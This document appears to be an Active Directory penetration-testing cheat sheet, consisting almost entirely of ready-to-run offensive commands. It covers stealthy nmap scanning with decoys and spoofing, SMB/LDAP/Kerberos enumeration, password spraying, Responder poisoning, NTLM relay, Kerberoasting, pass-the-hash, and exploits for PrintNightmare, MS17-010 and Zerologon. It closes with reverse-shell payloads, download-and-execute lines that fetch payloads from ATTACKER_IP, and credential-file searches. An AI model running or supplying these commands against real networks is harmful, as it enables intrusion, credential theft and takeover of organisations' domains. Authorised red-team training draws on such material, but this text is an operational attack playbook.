commands.code:
# Variables (define once)
export IP=10.10.10.10
export SUBNET=10.10.10.0/24
export DOMAIN=domain.local
export DC=dc.domain.local

# Host discovery (no port scan)
nmap -sn $SUBNET -oG alive_hosts.txt
nmap -sn $SUBNET --open | grep "Nmap scan report" | awk '{print $5}'

# Quick top 1000 port scan
nmap -sC -sV -O $IP -oA nmap_initial

# Full all ports scan (slow but thorough)
nmap -p- --min-rate 5000 $IP -oA nmap_allports

# Aggressive scan (OS + Version + Scripts + Traceroute)
nmap -A -T4 $IP -oA nmap_aggressive

# UDP scan (top 20 UDP ports)
nmap -sU --top-ports 20 $IP

sections.title: AD-Specific Scan (All AD Ports at Once)

commands.code:
# Main AD ports
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986,9389,49152-65535 \
     -sC -sV -O $IP -oA nmap_ad_full

# Full network scan to identify DCs
nmap -p 88,389,636,3268 --open $SUBNET -oG dcs.txt
grep "open" dcs.txt | awk '{print $2}'

# SMB
nmap -p 445 --script smb-os-discovery $IP
nmap -p 445 --script smb-enum-users $IP
nmap -p 445 --script smb-enum-shares $IP
nmap -p 445 --script smb-enum-domains $IP
nmap -p 445 --script smb-enum-sessions $IP
nmap -p 445 --script smb-enum-processes $IP
nmap -p 445 --script smb-ls --script-args smb-ls.shares=C$ $IP
nmap -p 445 --script smb2-security-mode $IP
nmap -p 445 --script smb-security-mode $IP
nmap -p 445 --script smb-protocols $IP
# SMB vulnerability scan
nmap -p 445 --script smb-vuln-ms17-010 $IP
nmap -p 445 --script smb-vuln-ms08-067 $IP
nmap -p 445 --script smb-vuln-regsvc-dos $IP
nmap -p 445 --script "smb-vuln*" $IP

# LDAP
nmap -p 389 --script ldap-rootdse $IP
nmap -p 389 --script ldap-search --script-args 'ldap.base="dc=domain,dc=local"' $IP
nmap -p 389,636 --script ldap-search \
     --script-args 'ldap.username="CN=user,DC=domain,DC=local",ldap.password=pass,ldap.base="DC=domain,DC=local"' $IP

# Kerberos
nmap -p 88 --script krb5-enum-users \
     --script-args krb5-enum-users.realm="DOMAIN.LOCAL",userdb=/usr/share/seclists/Usernames/Names/names.txt $IP

# RPC
nmap -p 135 --script msrpc-enum $IP

# WinRM
nmap -p 5985,5986 --script http-auth-finder $IP
nmap -p 5985 --script http-winrm-info $IP

# RDP
nmap -p 3389 --script rdp-enum-encryption $IP
nmap -p 3389 --script rdp-ntlm-info $IP
nmap -p 3389 --script rdp-vuln-ms12-020 $IP
nmap -p 3389 --script "rdp-*" $IP

# DNS
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=$DOMAIN $IP
nmap -p 53 --script dns-brute --script-args dns-brute.domain=$DOMAIN $IP
nmap -p 53 --script dns-recursion $IP
nmap -p 53 --script dns-service-discovery $IP

# MSSQL
nmap -p 1433 --script ms-sql-info $IP
nmap -p 1433 --script ms-sql-config $IP
nmap -p 1433 --script ms-sql-empty-password $IP
nmap -p 1433 --script ms-sql-ntlm-info $IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args "mssql.username=sa,mssql.password=,ms-sql-xp-cmdshell.cmd=whoami" $IP

# HTTP/HTTPS
nmap -p 80,443,8080,8443 --script http-title,http-headers,http-server-header $IP
nmap -p 80,443 --script http-vuln-cve2017-5638 $IP
nmap -p 80,443 --script "http-auth*" $IP

# Full AD All Scripts
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,1433 \
     --script smb-enum-shares,smb-enum-users,ldap-rootdse,ldap-search,\
krb5-enum-users,smb-os-discovery,smb-vuln-ms17-010,smb-enum-domains,\
smb-enum-sessions,smb2-security-mode,msrpc-enum,rdp-enum-encryption,\
rdp-ntlm-info,ssl-cert,ms-sql-info,smb-protocols \
     $IP -oA nmap_full_ad

# Slow scan (avoid detection)
nmap -T1 -p 445,389,88 $IP
nmap -T2 -p 445,389,88 $IP
nmap --scan-delay 5s $IP

# Packet fragmentation
nmap -f $IP
nmap -ff $IP
nmap --mtu 16 $IP

# Decoys (mask source)
nmap -D RND:10 $IP
nmap -D 192.168.1.5,192.168.1.6,ME $IP

# Source spoofing (requires low-level network access)
nmap -S 192.168.1.100 -e eth0 $IP

# Source port firewall bypass
nmap --source-port 53 $IP
nmap --source-port 88 $IP

# Scan via proxy
nmap --proxies socks4://127.0.0.1:9050 $IP

# Slow + fragmentation + decoys
nmap -T2 -f -D RND:5 --source-port 88 -p 445,389,88,3389 $IP

# Network discovery
netexec smb $SUBNET
netexec smb $SUBNET --gen-relay-list relay_targets.txt

# SMB Null Session
netexec smb $IP -u '' -p '' --shares
netexec smb $IP -u '' -p '' --users
netexec smb $IP -u '' -p '' --groups
netexec smb $IP -u 'guest' -p '' --shares

# SMB with credentials
netexec smb $IP -u user -p 'pass' --shares
netexec smb $IP -u user -p 'pass' --sessions
netexec smb $IP -u user -p 'pass' --loggedon-users
netexec smb $IP -u user -p 'pass' --pass-pol
netexec smb $IP -u user -p 'pass' --local-groups
netexec smb $IP -u user -p 'pass' --computers
netexec smb $IP -u user -p 'pass' --rid-brute

# LDAP
netexec ldap $IP -u user -p 'pass' --users
netexec ldap $IP -u user -p 'pass' --groups
netexec ldap $IP -u user -p 'pass' --password-not-required
netexec ldap $IP -u user -p 'pass' --admin-count
netexec ldap $IP -u user -p 'pass' --trusted-for-delegation
netexec ldap $IP -u user -p 'pass' -M get-desc-users
netexec ldap $IP -u user -p 'pass' -M ldap-signing
netexec ldap $IP -u user -p 'pass' -M adcs
netexec ldap $IP -u user -p 'pass' -M laps
netexec ldap $IP -u user -p 'pass' -M maq
netexec ldap $IP -u user -p 'pass' -M find-delegation

# WinRM
netexec winrm $IP -u user -p 'pass'
netexec winrm $SUBNET -u user -p 'pass'

# RDP
netexec rdp $IP -u user -p 'pass'
netexec rdp $SUBNET -u user -p 'pass'

# MSSQL
netexec mssql $SUBNET -u '' -p ''
netexec mssql $IP -u sa -p '' --local-auth
netexec mssql $IP -u user -p 'pass' --local-auth -q "SELECT name FROM sys.databases;"

# Command execution
netexec smb $IP -u admin -p 'pass' -x "whoami"
netexec smb $IP -u admin -p 'pass' -X "whoami"
netexec winrm $IP -u admin -p 'pass' -x "whoami"
netexec mssql $IP -u sa -p 'pass' -x "whoami"

# Useful modules
netexec smb $IP -u user -p 'pass' -M gpp_password
netexec smb $IP -u user -p 'pass' -M gpp_autologin
netexec smb $IP -u user -p 'pass' -M ms17-010
netexec smb $IP -u user -p 'pass' -M bluekeep
netexec smb $IP -u user -p 'pass' -M spider_plus
netexec smb $IP -u user -p 'pass' -M zerologon
netexec smb $IP -u user -p 'pass' -M petitpotam
netexec smb $IP -u user -p 'pass' -M nopac
netexec smb $IP -u user -p 'pass' -M printerbug

# Full enumeration
enum4linux-ng -A $IP -oA enum4linux_output
enum4linux-ng -A $IP
enum4linux -a $IP

# Specific options
enum4linux -U $IP
enum4linux -G $IP
enum4linux -S $IP
enum4linux -P $IP
enum4linux -i $IP
enum4linux -r $IP
enum4linux -R 500-1200 $IP

rpcclient -U "" -N $IP
rpcclient -U "domain\user%pass" $IP

# Inside rpcclient
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumalsgroups domain
rpcclient $> querydominfo
rpcclient $> getdompwinfo
rpcclient $> querydispinfo
rpcclient $> queryuser 0x1f4
rpcclient $> querygroup 0x200
rpcclient $> queryusergroups 0x1f4
rpcclient $> lookupnames administrator
rpcclient $> lsaquery
rpcclient $> lsaenumsid
rpcclient $> dsroledominfo

# RID brute-force (find all users)
for i in $(seq 500 1200); do
  result=$(rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep "User Name")
  [ -n "$result" ] && echo "RID $i: $result"
done

# Test anonymous bind
ldapsearch -H ldap://$IP -x -s base namingcontexts
ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" "(objectClass=*)" | head -100

# Full dump
ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" "(objectClass=user)" \
           sAMAccountName givenName sn description memberOf userAccountControl pwdLastSet | \
           tee ldap_users.txt

ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" "(objectClass=group)" \
           cn member distinguishedName | tee ldap_groups.txt

# Search for passwords in descriptions
ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" \
           "(description=*pass*)" sAMAccountName description

# Find accounts without Kerberos pre-auth
ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" \
           "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Find accounts with SPN (Kerberoastable)
ldapsearch -H ldap://$IP -x -b "DC=domain,DC=local" \
           "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# With credentials
ldapsearch -H ldap://$IP -D "domain\user" -w 'pass' \
           -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description

# ldapdomaindump (HTML + JSON output)
ldapdomaindump -u "domain\user" -p 'pass' ldap://$IP -o /tmp/ldap_dump/
firefox /tmp/ldap_dump/domain_users.html

# User enumeration
kerbrute userenum -d $DOMAIN --dc $IP \
         /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
         -o valid_users.txt -t 50

kerbrute userenum -d $DOMAIN --dc $IP \
         /usr/share/seclists/Usernames/Names/names.txt \
         -o valid_users.txt

# With custom wordlist (first.last format)
kerbrute userenum -d $DOMAIN --dc $IP users_custom.txt -o valid_users.txt --downgrade

# Password spray (CHECK POLICY FIRST!)
kerbrute passwordspray -d $DOMAIN --dc $IP valid_users.txt 'Welcome1!'
kerbrute passwordspray -d $DOMAIN --dc $IP valid_users.txt 'Password2024!'
kerbrute passwordspray -d $DOMAIN --dc $IP valid_users.txt 'Spring2025@'
kerbrute passwordspray -d $DOMAIN --dc $IP valid_users.txt "$DOMAIN" --delay 3000

# Targeted brute force
kerbrute bruteuser -d $DOMAIN --dc $IP rockyou.txt targetuser

# Generate usernames from a name list
# Format: first.last, flast, firstl, etc.
username-anarchy -f users.txt --format first.last > usernames_fl.txt
username-anarchy -f users.txt --format flast > usernames_fl2.txt

# Manual generation
awk '{print tolower($1"."$2)}' names.txt > usernames.txt
awk '{print tolower(substr($1,1,1)$2)}' names.txt
awk '{print tolower($1)}' names.txt

# ALWAYS check password policy FIRST
netexec smb $IP -u user -p pass --pass-pol
enum4linux -P $IP
rpcclient -U "" -N $IP -c "getdompwinfo"

# CrackMapExec / NetExec spray (one password at a time!)
netexec smb $IP -u valid_users.txt -p 'Welcome1!' --continue-on-success
netexec smb $IP -u valid_users.txt -p 'Password2024!' --continue-on-success
netexec ldap $IP -u valid_users.txt -p 'Welcome1!' --continue-on-success

# Multi-password spray WITHOUT lockout (1:1 ratio)
netexec smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Spray local accounts
netexec smb $SUBNET -u administrator -p 'Welcome1!' --local-auth --continue-on-success

# Analyze network (passive mode, nothing is sent)
sudo responder -I eth0 -A

# Active mode (responds to LLMNR/NBT-NS requests)
sudo responder -I eth0 -wdPv

# Responder + SMB disabled (for relay)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo nano /etc/responder/Responder.conf
sudo responder -I eth0 -wd

# View captured hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-$IP.txt
ls /usr/share/responder/logs/

# NTLMv2 (mode 5600)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt --rules-file best64.rule
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
john --format=netntlmv2 --wordlist=rockyou.txt ntlmv2_hashes.txt

# NTLMv1 (mode 5500) - rarer but faster to crack
hashcat -m 5500 ntlmv1_hashes.txt rockyou.txt

# NTHash (mode 1000)
hashcat -m 1000 nthashes.txt rockyou.txt
hashcat -m 1000 nthashes.txt rockyou.txt --rules-file best64.rule

# List targets without SMB signing
nmap -p 445 --script smb2-security-mode $SUBNET | grep -B3 "not required"
netexec smb $SUBNET --gen-relay-list relay_targets.txt

# Basic relay → auto SAM dump
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay + command execution
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
                    -c "powershell -enc BASE64REVSHELL"

# Relay + interactive shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# Relay → LDAP (add admin user)
impacket-ntlmrelayx -t ldap://$IP --escalate-user compromised_user

# Relay → LDAPS (create computer account)
impacket-ntlmrelayx -t ldaps://$IP --add-computer EvilPC --computer-password 'P@ssw0rd!'

# mitm6 + LDAP Relay (IPv6)
sudo mitm6 -d $DOMAIN &
impacket-ntlmrelayx -6 -t ldaps://$IP -wh fakewpad.$DOMAIN \
                    --add-computer EvilPC --computer-password 'P@ss!'

sections.title: AS-REP Roasting (No Credentials Required if Valid Users)

commands.code:
# Dump AS-REP hashes
impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -no-pass -usersfile valid_users.txt \
                   -format hashcat -outputfile asrep.hashes

impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -no-pass -request \
                   -usersfile valid_users.txt -outputfile asrep.hashes

# Crack
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes rockyou.txt -r OneRuleToRuleThemAll.rule
john --format=krb5asrep --wordlist=rockyou.txt asrep.hashes

# Dump TGS tickets (SPNs)
impacket-GetUserSPNs $DOMAIN/user:pass -dc-ip $IP -request \
                     -outputfile kerb.hashes

# Targeted
impacket-GetUserSPNs $DOMAIN/user:pass -dc-ip $IP -request-user svcSQL \
                     -outputfile kerb_sql.hashes

# Crack
hashcat -m 13100 kerb.hashes rockyou.txt
hashcat -m 19700 kerb.hashes rockyou.txt
john --format=krb5tgs --wordlist=rockyou.txt kerb.hashes

# Test credentials on all protocols
netexec smb $IP -u user -p 'pass'
netexec winrm $IP -u user -p 'pass'
netexec rdp $IP -u user -p 'pass'
netexec mssql $IP -u user -p 'pass'
netexec ldap $IP -u user -p 'pass'

# Test NTLM hash
netexec smb $IP -u user -H NTLMHASH
netexec smb $IP -u Administrator -H NTLMHASH --local-auth
netexec smb $SUBNET -u Administrator -H NTLMHASH --local-auth --continue-on-success

# Check if admin
netexec smb $IP -u user -p 'pass' | grep -i "pwn3d\|admin"

# Impacket PsExec → SYSTEM shell
impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH

# Impacket smbexec → cmd shell
impacket-smbexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH

# Impacket wmiexec → semi-interactive
impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH

# Impacket atexec → exec via scheduler
impacket-atexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH "whoami"

# Evil-WinRM → PowerShell shell
evil-winrm -i $IP -u Administrator -H NTLMHASH

# xfreerdp → GUI session
xfreerdp /v:$IP /u:Administrator /pth:NTLMHASH /cert-ignore /dynamic-resolution

# psexec → SYSTEM shell via SMBExec (creates a service)
impacket-psexec $DOMAIN/user:pass@$IP
impacket-psexec $DOMAIN/user:pass@$IP cmd.exe
impacket-psexec $DOMAIN/user:pass@$IP powershell
impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH

# smbexec → Shell via temporary SMB share (stealthier than psexec)
impacket-smbexec $DOMAIN/user:pass@$IP
impacket-smbexec $DOMAIN/user@$IP -hashes :NTLMHASH

# wmiexec → Shell via WMI (no service creation, stealthier)
impacket-wmiexec $DOMAIN/user:pass@$IP
impacket-wmiexec $DOMAIN/user@$IP -hashes :NTLMHASH

# dcomexec → Shell via DCOM
impacket-dcomexec $DOMAIN/user:pass@$IP -object MMC20
impacket-dcomexec $DOMAIN/user:pass@$IP -object ShellBrowserWindow

# Check if session is SYSTEM or admin
impacket-psexec $DOMAIN/user:pass@$IP -c "whoami && whoami /priv"

# evil-winrm (full PowerShell shell)
evil-winrm -i $IP -u user -p 'pass'
evil-winrm -i $IP -u user -H NTLMHASH
evil-winrm -i $IP -u user -p 'pass' -s /opt/scripts/
evil-winrm -i $IP -u user -p 'pass' -e /opt/exes/

# Inside evil-winrm:
menu
Invoke-Binary /opt/exes/SharpHound.exe
upload /local/path /remote/path
download C:\loot\hash.txt /local/
bypass-4msi

# Via Impacket
impacket-wmiexec $DOMAIN/user:pass@$IP -shell-type powershell

# xfreerdp (Linux)
xfreerdp /v:$IP /u:user /p:'pass' /cert-ignore /dynamic-resolution
xfreerdp /v:$IP /u:user /p:'pass' /cert-ignore +clipboard /drive:share,/tmp
xfreerdp /v:$IP /u:Administrator /pth:NTLMHASH /cert-ignore

# rdesktop
rdesktop -u user -p 'pass' $IP
rdesktop -u 'DOMAIN\user' -p 'pass' $IP

# remmina (GUI)
remmina -c rdp://user:pass@$IP

# impacket-mssqlclient → SQL shell + xp_cmdshell
impacket-mssqlclient $DOMAIN/user:pass@$IP -windows-auth
impacket-mssqlclient sa:pass@$IP
impacket-mssqlclient $DOMAIN/user@$IP -hashes :NTLMHASH -windows-auth

# Via netexec
netexec mssql $IP -u sa -p 'pass' --local-auth -x "whoami"

# Check vulnerability
netexec smb $IP -u user -p 'pass' -M printnightmare

# Linux → RCE via DLL
python3 CVE-2021-1675.py $DOMAIN/user:pass@$IP \
        '\\ATTACKER_IP\share\evil.dll'

# Windows → Add local admin
.\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd!"

# After → Connect with the new account
evil-winrm -i $IP -u hacker -p 'P@ssw0rd!'

# Check
nmap -p 445 --script smb-vuln-ms17-010 $IP
netexec smb $IP -u '' -p '' -M ms17-010

# Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
set RHOSTS $IP
set LHOST 10.10.14.5
set LPORT 4444
run

# Manual (Impacket)
# Listen: nc -lvnp 4444
python3 zzz_exploit.py $IP

# Scan
netexec smb $IP -u '' -p '' -M zerologon
python3 zerologon_tester.py DC_NETBIOS_NAME $IP

# Exploit (reset DC machine account password → empty)
python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME $IP

# Dump all hashes via secretsdump
impacket-secretsdump -no-pass -just-dc $DOMAIN/DC_NETBIOS_NAME\$@$IP

# RESTORE THE PASSWORD (important even in lab!)
python3 restorepassword.py $DOMAIN/DC_NETBIOS_NAME@DC_NETBIOS_NAME \
        -target-ip $IP -hexpass ORIGINAL_HEX_PASS

# Prepare the listener
nc -lvnp 4444
rlwrap nc -lvnp 4444

# Encode in base64 (from Linux)
python3 -c "
import base64
cmd='$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.5\",4444);...'
enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
print(enc)"

# Launch the encoded shell
powershell -nop -w hidden -enc <BASE64>

# Nishang OneLiners - Load and execute Invoke-PowerShellTcp
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# ConPtyShell (full interactive shell)
# On attacker: stty raw -echo; nc -lvnp 4444
IEX(IWR http://ATTACKER_IP/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell ATTACKER_IP 4444

# MSFVenom payloads
# EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
# Staged (Meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > meter.exe
# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll > evil.dll
# PowerShell (base64)
msfvenom -p cmd/windows/reverse_powershell LHOST=ATTACKER_IP LPORT=4444

# Upload and execute
# Simple HTTP server (attacker)
python3 -m http.server 80
python3 -m http.server 8080

# Download from Windows (victim)
certutil -urlcache -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe
powershell -c "Invoke-WebRequest http://ATTACKER_IP/shell.exe -OutFile C:\Windows\Temp\shell.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/shell.exe','C:\Windows\Temp\shell.exe')"
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe

# Execute
C:\Windows\Temp\shell.exe
Start-Process C:\Windows\Temp\shell.exe

# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Full TTY upgrade
# In the basic shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (suspend)
stty raw -echo; fg
# In the shell:
export TERM=xterm-256color
stty rows 50 columns 200

# rlwrap
rlwrap nc -lvnp 4444

# socat (full TTY from the start)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim (PowerShell):
socat exec:'cmd.exe',pty,stderr tcp:ATTACKER_IP:4444

# Who am I?
whoami /all
whoami /priv
net user %username% /domain
echo %logonserver%
ipconfig /all
systeminfo
hostname

# Network topology
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state

# Quick credential search
dir /s *pass* *cred* *secret* *.config 2>nul
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
